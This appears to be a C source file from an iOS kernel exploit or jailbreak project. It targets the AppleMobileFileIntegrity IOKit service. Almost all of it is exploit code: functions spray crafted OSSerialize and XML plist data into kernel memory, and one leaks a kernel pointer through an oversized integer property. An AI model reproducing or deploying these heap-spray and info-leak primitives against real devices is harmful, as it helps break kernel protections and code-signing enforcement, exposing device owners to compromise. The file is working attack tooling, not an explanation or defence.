#include "../IOKit/IOKitLib.h"
#include <mach/mach.h>
#include <stdlib.h>

#include "plog.h"
#include "common.h"
#include "io.h"

kern_return_t io_service_open_extended(mach_port_t service, task_t owningTask, uint32_t connect_type, NDR_record_t ndr, io_buf_ptr_t properties, mach_msg_type_number_t propertiesCnt, kern_return_t *result, mach_port_t *connection);

static mach_port_t get_io_master_port(void)
{
    static mach_port_t master = MACH_PORT_NULL;
    if(master == MACH_PORT_NULL)
    {
        //DEVLOG("getting IO master port...");
        kern_return_t ret = host_get_io_master(mach_host_self(), &master);
        if(ret != KERN_SUCCESS || !MACH_PORT_VALID(master))
        {
            ERR("failed to get IO master port (port = 0x%08x, ret = %u: %s)", master, ret, mach_error_string(ret));
            return MACH_PORT_NULL;
        }
    }
    return master;
}

static io_service_t _io_get_service(void)
{
    static io_service_t service = MACH_PORT_NULL;
    if(service == MACH_PORT_NULL)
    {
        //DEVLOG("getting IO service handle...");
        service = IOServiceGetMatchingService(get_io_master_port(), IOServiceMatching("AppleMobileFileIntegrity"));
        if(!MACH_PORT_VALID(service))
        {
            ERR("failed to get IO service handle (port = 0x%08x)", service);
            return MACH_PORT_NULL;
        }
    }
    return service;
}

io_connect_t _io_spawn_client(void *dict, size_t dictlen)
{
    //DEVLOG("spawning user client / Parsing dictionary...");
    io_connect_t client = MACH_PORT_NULL;
    kern_return_t err;
    
    kern_return_t ret = io_service_open_extended(_io_get_service(), mach_task_self(), 0, NDR_record, dict, dictlen, &err, &client);
    if(ret != KERN_SUCCESS || err != KERN_SUCCESS || !MACH_PORT_VALID(client))
    {
        ERR("failed to parse dictionary (client = 0x%08x, ret = %u: %s, err = %u: %s)", client, ret, mach_error_string(ret), err, mach_error_string(err));
        return MACH_PORT_NULL;
    }
    return client;
}

mach_port_t spray_OSSerialize(void* data, size_t size)
{
    uint32_t offset = 1;

    int cnt = 0;
    int dict_sz = size + (6 * sizeof(uint32_t)) + (offset * 4)/* haxx */;
    uint32_t* dictz = calloc(1, dict_sz);
    dictz[cnt++] = kOSSerializeMagic;
    dictz[cnt++] = kOSSerializeDictionary | kOSSerializeEndCollection | 0x2;
    dictz[cnt++] = kOSSerializeSymbol | 0x4;
    dictz[cnt++] = 0x00424242;
    dictz[cnt++] = kOSSerializeData | size | kOSSerializeEndCollection;
    dictz[cnt++] = 0x0; /* haxx */
    memcpy(dictz + 5 + offset/* haxx */, data, size);
    
    return _io_spawn_client(dictz, dict_sz);
}

// https://github.com/staturnzz/lyncis
void spray_OSUnserializeXML(uint8_t *data, size_t size)
{
    char *buf = calloc(1, 10000);
    strcpy(buf, "<plist version=\"1.0\">\n");
    strcat(buf, "<dict>\n");

    for (int i = 0; i < 8; i++){
        char tmp[32] = {0};
        sprintf(tmp, "<key>%c</key>\n", 'a'+i);
        strcat(buf, tmp);
        strcat(buf, "<data format=\"hex\">");

        size_t sz = strlen(buf);
        for (size_t j = 0; j < size; ++j) {
            sz += sprintf(buf + sz, "%02x", data[j]);
        }
        strcat(buf, "</data>\n");
    }

    strcat(buf, "</dict>\n</plist>\0");
    size_t sz = strlen(buf) + 1;
    _io_spawn_client(buf, sz);
    return;
}

int leak_anchor(addr_t* anchor)
{
    io_iterator_t it = MACH_PORT_NULL;
    io_object_t o = MACH_PORT_NULL;
    kern_return_t ret;
    
    const char xml[] = "<plist><dict><key>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</key><integer size=\"512\">1768515945</integer></dict></plist>";
    
    _io_spawn_client((char*)xml, sizeof(xml));
    
    IORegistryEntryGetChildIterator(_io_get_service(), "IOService", &it);
    
    bool found = false;
    while((o = IOIteratorNext(it)) != MACH_PORT_NULL && !found)
    {
        uintptr_t buf[16];
        uint32_t size = (uint32_t)sizeof(buf);
        ret = IORegistryEntryGetProperty(o, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", (char*)buf, &size);
        if(ret == KERN_SUCCESS)
        {
            *anchor = buf[9];
            return 0;
        }
        IOObjectRelease(o);
        o = MACH_PORT_NULL;
    }
    return -1;
}
